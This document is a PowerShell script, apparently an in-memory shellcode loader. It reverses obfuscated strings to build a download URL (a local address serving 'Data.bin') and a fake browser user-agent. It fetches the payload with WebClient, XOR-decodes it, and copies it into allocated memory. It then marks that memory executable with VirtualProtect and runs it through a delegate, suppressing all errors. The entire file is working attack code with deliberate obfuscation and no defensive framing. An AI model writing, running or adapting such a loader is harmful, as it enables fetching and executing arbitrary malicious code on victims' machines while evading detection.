# Obfuscated configuration
$vZXaUKqItnvQReHBdYjBA = (([regex]::Matches('nib.ataD//0008:1.0.0.721//:ptth','.','RightToLeft') | ForEach {$_.value}) -join '')
$HjlmYRuVUorAxYeRaIMQX = (([regex]::Matches('63.735/kiTtAeK//46x x64; 46niW ;0.0 TN sdoW( 0.5/azillioM','.','RightToLeft') | ForEach {$_.value}) -join '')
$Xkey = 0xAA  # XOR key for deobfuscation

# Obfuscated P/Invoke declarations
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class ARDeDbSySUEMdtYlbJtP {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        int dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );
}
"@

# Main obfuscated function
function xQzKpLmNvRwE() {
    param([string]$DownloadUrl, [string]$UA, [byte]$Xkey)
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", $UA)
        $encryptedData = $webClient.DownloadData($DownloadUrl)
        
        # XOR deobfuscation
        $binaryData = New-Object byte[] $encryptedData.Length
        for ($i = 0; $i -lt $encryptedData.Length; $i++) {
            $binaryData[$i] = $encryptedData[$i] -bxor $Xkey
        }
        
        # Allocate memory with obfuscated calls
        $codeAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($binaryData.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($binaryData, 0, $codeAddr, $binaryData.Length)
        
        # Change memory protection to executable
        $oldProtect = 0
        $result = [ARDeDbSySUEMdtYlbJtP]::VirtualProtect($codeAddr, $binaryData.Length, 0x40, [ref]$oldProtect)
        
        if ($result) {
            # Execute with obfuscated delegate
            $execDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($codeAddr, [Action])
            $execDelegate.Invoke()
        }
    } catch { }
}

# Execute the obfuscated function
xQzKpLmNvRwE -DownloadUrl $vZXaUKqItnvQReHBdYjBA -UA $HjlmYRuVUorAxYeRaIMQX -Xkey $Xkey